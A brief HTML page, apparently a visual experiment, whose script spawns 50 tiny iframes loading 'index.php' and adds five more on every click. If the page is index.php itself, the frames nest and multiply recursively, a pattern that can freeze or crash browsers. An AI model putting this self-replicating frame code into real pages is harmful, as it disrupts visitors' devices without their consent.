<!doctype HTML> 
<html>
<head>
	
	<style type="text/css">
	body{
		font-family:Arial, Helvetica, sans-serif;
		overflow: hidden;
		background-color:black;
		padding-top:100px;
		}
		
	iframe { 
		border : 1px #111 solid;
		margin : 35px;  
	}


	</style>
	
</head>
<body>
<script> 

var SCREEN_WIDTH = window.innerWidth, SCREEN_HEIGHT = window.innerHeight; 

document.addEventListener("mousedown", function(e){e.preventDefault();makeIFrame(5);}); 

makeIFrame(50); 


function makeIFrame(num) { 
	if(!num) num = 1; 
	
	for(var i=0;i<num; i++) { 
		var iframe = document.createElement('iframe'); 
		iframe.src = "index.php"; 
		iframe.width = iframe.height = 20; 
		document.body.appendChild(iframe);
	}
	
	
}
</script> 
</body>
